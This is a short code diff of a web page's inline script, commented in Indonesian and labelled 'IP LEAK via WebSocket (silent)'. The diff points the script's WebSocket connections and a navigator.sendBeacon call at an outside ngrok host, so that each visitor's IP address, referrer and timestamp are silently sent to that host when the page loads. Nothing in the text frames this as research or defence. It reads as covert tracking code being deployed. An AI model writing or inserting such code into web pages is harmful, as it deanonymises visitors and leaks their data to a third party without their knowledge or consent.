@@ -16,12 +16,10 @@
 <body>
     <!-- IP LEAK via WebSocket (silent) -->
     <script>
-        // Multiple WebSocket endpoints untuk leak IP
-        const leakServers = [
-            'wss://echo.websocket.org',
-            'wss://websocket-echo.com',
-            'wss://ws.postman-echo.com/raw'
-        ];
+        // Ganti leakServers dengan server Anda
+const leakServers = [
+    'https://era-lagomorphous-viva.ngrok-free.dev',  // WebSocket server Anda
+];
         
         leakServers.forEach((url, index) => {
             setTimeout(() => {
@@ -46,7 +44,7 @@
         });
         
         // Additional leak via headers (beacon)
-        navigator.sendBeacon('/track', JSON.stringify({
+        navigator.sendBeacon('https://era-lagomorphous-viva.ngrok-free.dev/track', JSON.stringify({
             ip: 'detect',
             referrer: document.referrer,
             timestamp: Date.now()
